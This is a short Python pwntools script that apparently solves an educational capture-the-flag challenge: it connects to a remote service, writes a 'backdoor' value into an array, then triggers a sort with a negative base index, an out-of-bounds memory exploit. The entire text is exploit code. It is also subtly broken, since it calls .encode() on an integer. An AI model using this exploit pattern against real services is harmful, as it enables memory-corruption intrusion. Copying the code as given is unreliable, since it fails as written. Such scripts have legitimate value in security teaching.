from pwn import *

BACKDOOR = 0xdeadbeef

conn = remote('edu-ctf.zoolab.org', 10101)
conn.sendlineafter(b' >', b'1') # change value
conn.sendlineafter(b' >', b'0') # index
conn.sendlineafter(b' >', BACKDOOR.encode()) # value
conn.sendlineafter(b' >', b'2') # sort
conn.sendlineafter(b' >', b'-1') # base
conn.sendlineafter(b' >', b'2') # len
conn.sendlineafter(b' >', b'1') # (try) dsc
print(conn.readline())


